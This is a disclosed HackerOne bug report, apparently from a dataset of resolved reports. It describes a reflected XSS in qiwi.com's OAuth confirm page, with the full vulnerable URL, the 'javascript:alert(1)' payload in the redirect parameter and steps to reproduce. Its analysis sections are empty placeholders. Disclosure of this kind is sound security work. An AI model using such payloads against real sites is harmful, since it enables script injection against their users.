---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '36319'
original_report_id: '36319'
title: '[qiwi.com] /oauth/confirm.action XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2014-11-17T12:33:08.786Z'
disclosed_at: '2014-12-20T15:45:06.970Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [qiwi.com] /oauth/confirm.action XSS

## Metadata

- HackerOne Report ID: 36319
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2014-12-20T15:45:06.970Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey hi,

I have found a XSS in oauth2 

vulnerable link: https://qiwi.com/oauth/confirm.action?redirect=javascript:alert(1);/////&clientId=kav_subscribe

steps to reproduce:
1) open the following link https://qiwi.com/oauth/confirm.action?redirect=javascript:alert(1);/////&clientId=kav_subscribe
2) click Вернуться на сайт магазина
3) you will a alert on the browser.

Vulnerable parameter: redirect=
payload: javascript:alert(1);/////
POC: look for attached screenshot.


Thanks,
karthik

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
